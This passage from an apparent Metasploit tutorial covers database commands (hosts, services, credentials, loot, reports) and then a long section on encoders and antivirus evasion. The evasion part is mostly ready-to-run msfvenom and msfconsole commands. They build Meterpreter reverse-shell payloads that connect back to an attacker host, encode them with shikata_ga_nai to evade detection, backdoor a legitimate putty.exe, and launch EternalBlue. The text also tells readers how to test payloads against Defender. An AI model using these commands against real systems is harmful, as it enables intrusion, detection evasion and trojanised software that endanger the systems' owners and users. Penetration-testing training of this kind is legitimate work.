RHOSTS => 192.168.1.10 192.168.1.11 192.168.1.12
```


## Services Management

|Command |Purpose|
|----|----|
|services| List all services|
|services -p [port]| List services on specific port|
|services -r [protocol]| List services by protocol (tcp/udp)|
|services -u| List only running services|
|services -d [ip] |Delete services for a host|

- **Example: Find all web servers**

```bash
services -p 80 -p 443 -p 8080
```

- **Example: Show SMB services (port 445)**

```bash
services -p 445
```


## Credentials Management

|Command| Purpose|
|----|----|
|creds |List all credentials|
|creds -a| Add a credential|
|creds -d| Delete credentials|
|creds -h |Show help|

- **Example: Add a discovered credential**

```bash
creds add user:administrator pass:password123 host:192.168.1.10
```

- **Example: List stored credentials**

```bash
creds
```


## Vulnerabilities Management

|Command |Purpose|
|----|----|
|vulns| List all vulnerabilities|
|vulns -d |Delete vulnerabilities|
|vulns -h| Show help|

- When you run check on an exploit and it confirms vulnerability, Metasploit automatically adds it to the vulns table.


## Loot Management

- Loot is data collected during post-exploitation (hashes, screenshots, downloaded files).

|Command |Purpose|
|----|----|
|loot |List all loot|
|loot -d |Delete loot|
|loot -h |Show help|


## Notes Management

- Add custom notes to hosts.

|Command |Purpose|
|----|----|
|notes| List all notes|
|notes -a [text]| Add a note to current host|
|notes -d |Delete notes|

- **Example: Add a note**

```bash
notes -a "This host runs an outdated Apache 2.2"
```


## Reporting Commands

- Generate reports from database contents.

|Command |Format| Purpose|
|----|----|----|
|report| HTML |Generate HTML report|
|report XML| Generate XML report|
|report CSV |Generate CSV report|

- **Example: Generate HTML report**

```bash
report -f html -o /tmp/report.html
```


## Database Maintenance

|Command| Purpose|
|----|----|
|db_connect [name]| Connect to a database|
|db_disconnect| Disconnect from database|
|db_remove [name]| Remove a database|
|db_rebuild_cache| Rebuild module cache|


## Real-World Database Workflow


- Start PostgreSQL and msfconsole with database
```bash
sudo systemctl start postgresql
msfconsole -d
```
- Create a workspace for your target
```bash
workspace -a TargetCorp
```
- Import an Nmap scan
```bash
db_import /home/user/nmap_scan.xml
```
- List discovered hosts
```bash
hosts
```
- List services (look for interesting ports)
```bash
services -p 80 -p 443 -p 445 -p 3306
```
- Set RHOSTS to all discovered hosts
```bash
hosts -R
```
- Find exploits for discovered services
```bash
search type:exploit platform:windows name:smb
```
- After exploitation, add credentials
```bash
creds add user:Administrator pass:P@ssw0rd host:192.168.1.10
```
- Generate a report
```bash
report -f html -o /tmp/TargetCorp_report.html
```
- Save your work
```bash
workspace -a TargetCorp_COMPLETED
```


## Common Database Commands Cheat Sheet

|Task| Command|
|----|----|
|Check connection| db_status|
|Create workspace| workspace -a [name]|
|Switch workspace| workspace [name]|
|List workspaces| workspace|
|Import scan| db_import [file]|
|List hosts |hosts|
|List services |services|
|Set RHOSTS from hosts| hosts -R|
|List credentials| creds|
|List vulnerabilities| vulns|
|Generate report| report -f html -o [file]|



# 7. Encoders and Evasion

### What Are Encoders?

- Encoders transform a payload into a different representation to avoid detection by antivirus (AV) and intrusion detection systems (IDS). They don't make payloads "undetectable forever," but they can help evade signature-based detection.

**Common use cases:**
- Bypassing simple antivirus signatures
- Avoiding character blacklists in exploits
- Shrinking or expanding payload size

> **Important:** Modern EDR (Endpoint Detection and Response) is not fooled by basic encoding. Use encoders as one layer, not your only defense.

---

### Finding Encoders

| Command | Purpose |
|---------|---------|
| `show encoders` | List all available encoders |
| `msfvenom -l encoders` | List encoders from command line |

**Example output:**
```text
msf6 > show encoders
```

### Compatible Encoders
 
  | Name     |               Rank   |    Description|
 |  ----              |      ----     |  -----------|
  | cmd/brace    |           low   |     Brace Expansion|
  | cmd/echo  |             low    |    Echo Command|
  | generic/none    |        normal |    The "none" Encoder|
  | x86/shikata_ga_nai    |  excellent  |Polymorphic XOR Additive Feedback Encoder|


## Encoder Rankings

|Rank	|Meaning	|Reliability|
|----|----|----|
|excellent	|Very reliable, should bypass most signature-based AV|	Best choice|
|great|	Reliable, good for most situations|	Good choice|
|good	|Works in many cases	|Decent choice|
|normal	|Standard, might be detected	|Try if others fail|
|low	|Rarely works, old signatures	|Last resort|
|manual	|Requires manual tweaking	|Advanced users only|


## The Most Useful Encoder: shikata_ga_nai

x86/shikata_ga_nai (Japanese for "it can't be helped") 
- is the most popular encoder in Metasploit. It's polymorphic—each generated payload looks different.

- **Why it works:**

  - XOR encryption with random keys

  - Multiple iterations change the payload each time

  -  Self-decrypting code evades simple pattern matching
 

 ## Using Encoders in msfconsole

- When setting a payload for an exploit, you can also set an encoder:
```bash
 use exploit/windows/smb/ms17_010_eternalblue
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.5
 set LPORT 4444
 show encoders
 set encoder x86/shikata_ga_nai
 set iterations 5
 run
```
|Parameter	|Purpose|
|----|----|
|set encoder [name]|	Choose which encoder to use|
|set iterations [number]|	How many times to encode (1-10, default 1)|


## Using Encoders with msfvenom

- Most encoding happens during payload generation with msfvenom.

- **Basic encoded payload:**
```bash
  msfvenom -p windows/x64/meterpreter/reverse_tcp
  LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell.exe
```
- **Multiple iterations (more encoding passes):**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5
LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell_encoded.exe
```
|Flag	|Purpose	|Example|
|----|----|----|
|-e|	Encoder to use	|-e x86/shikata_ga_nai|
|-i	|Iterations|	-i 5 (5 encoding passes)|


## Evasion Techniques

- Evasion isn't just about encoders. Multiple techniques can help you avoid detection.

- 1. Use stageless payloads
Stageless payloads are larger but sometimes bypass certain AV heuristics.
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o stageless.exe
```
- 2. Use PowerShell instead of EXE
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f psh-reflection -o payload.ps1
```
- 3. Use different output formats

|Format	|Command	|use Case|
|----|----|----|
|EXE|	-f exe	|Windows executables|
|PowerShell|	-f psh-reflection|	Run from PowerShell|
|VBA	|-f vba	|Office macros|
|C	|-f c	|Manual compilation|
|Python	|-f python|	Cross-platform|
|Java|	-f jar	|Java applications|

- 4. Embed payload in legitimate executable
     ```bash
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/putty.exe -f exe -o putty_backdoor.exe
     ```
   - The "-x"flag uses a legitimate executable as a template. The payload runs first, then the original program runs normally.

- 5. Use custom templates
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /path/legitimate.exe -k -f exe -o backdoor.exe
```
- The "-k" flag runs the payload in a separate thread, keeping the original program functional.



## Additional Evasion Options

|Flag	|Purpose	|Example|
|---|----|----|
|-n	|Add NOP sled	|-n 32 (32 byte NOP sled)|
|-s	|Maximum size of encoded payload	|-s 4096|
|-b	|Bad characters to avoid	|-b '\x00\xff'|

- **Bad characters example:**
 - Some exploits can't handle certain characters (like null bytes \x00). The encoder will avoid generating those characters.
 ```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -b '\x00\x0a\x0d' -f exe -o shell.exe
 ```

## Limitations of Encoders
|Limitation|	Why It Matters|
|----|----|
|Modern EDR uses behavior detection|	Encoders only fool signature-based AV|
|Encoded payloads still run in memory|EDR sees what the payload does, not how it's encoded|
|Multiple iterations can break payloads|	Over-encoding can corrupt the payload|
|Some encoders are blacklisted|	Known encoder signatures are detected|

>**Real talk:** Basic encoders like "shikata_ga_nai" won't bypass modern EDR (CrowdStrike, SentinelOne, Defender for Endpoint). For real evasion, you need >advanced techniques like process injection, custom crypters, or living-off-the-land techniques.


## The Real Evasion Pyramid
|Level	|Technique	|Effectiveness|
|----|----|----|
|1. Basic	|Encoders (shikata_ga_nai)	|Bypasses old AV only|
|2. Custom|	Private encoders, custom templates|Better, still may be caught|
|3. Advanced	|Process injection, unhooking	|Bypasses many EDRs|
|4. Expert|	BYOVD (Bring Your Own Vulnerable Driver), kernel callbacks	|High-end evasion|

- Your Metasploit encoders are Level 1. Useful for legacy systems and CTFs. Not useful against modern corporate defenses.


## Common Encoder Workflows

- Quick encoded EXE:
 ```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
```

- Encoded PowerShell payload:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f psh-reflection -o payload.ps1
```

- Encoded payload embedded in legitimate EXE:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -x /usr/share/windows-binaries/putty.exe -e x86/shikata_ga_nai -i 5 -f exe -o putty_backdoor.exe
```


## Testing Your Payload

- Before using a payload, test it:

   - Upload to VirusTotal (use a disposable VM, not your real IP)

   - Test against Windows Defender on a local VM

   -  Use online sandboxes (Joe Sandbox, ANY.RUN) with caution

   >Warning: Never upload real payloads to VirusTotal. They'll be shared with AV companies. Use a VPN or test in isolated VMs.



## Evasion Cheat Sheet
|Goal|	Command|
|----|----|
|List encoders|show encoders|
|Use basic encoder	|set encoder x86/shikata_ga_nai|
|Multiple iterations (msfconsole)	|set iterations 5|
|Encoded EXE (msfvenom)	|msfvenom -p [payload] -e [encoder] -f exe -o [file]|
|Encoded PowerShell	|msfvenom -p [payload] -e [encoder] -f psh-reflection -o [file]|
|Embed in legitimate EXE	|msfvenom -p [payload] -x [legit.exe] -f exe -o backdoor.exe|
|Avoid bad characters	|msfvenom -b '\x00\xff'|



